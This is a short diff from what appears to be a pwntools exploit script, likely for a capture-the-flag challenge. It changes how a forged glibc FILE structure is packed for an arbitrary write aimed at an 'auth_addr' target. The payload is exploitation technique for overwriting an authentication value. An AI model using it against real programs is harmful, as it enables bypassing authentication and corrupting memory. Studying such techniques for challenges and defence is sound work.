@@ -145,12 +145,12 @@ info(f"Target address: {hex(auth_addr)}")
 
 # Crafting the fake FILE structure for arbitrary write
 payload = flat({
-    0x00: p64(0xfbad0000 & ~4),   # _flags: MAGIC, clear NO_READS
-    0x08: p64(0),                 # _IO_read_ptr
-    0x10: p64(0),                 # _IO_read_end
-    0x38: p64(auth_addr),         # _IO_buf_base (Target)
-    0x40: p64(auth_addr + 0x101), # _IO_buf_end
-    0x70: p32(0),                 # _fileno (stdin)
+    0x00: 0xfbad0000 & ~4,   # _flags: MAGIC, clear NO_READS
+    0x08: 0,                 # _IO_read_ptr
+    0x10: 0,                 # _IO_read_end
+    0x38: auth_addr,         # _IO_buf_base (Target)
+    0x40: auth_addr + 0x101, # _IO_buf_end
+    0x70: 0,                 # _fileno (stdin)
 }, filler=b"\x00")
 
 # Send the corrupted FILE structure
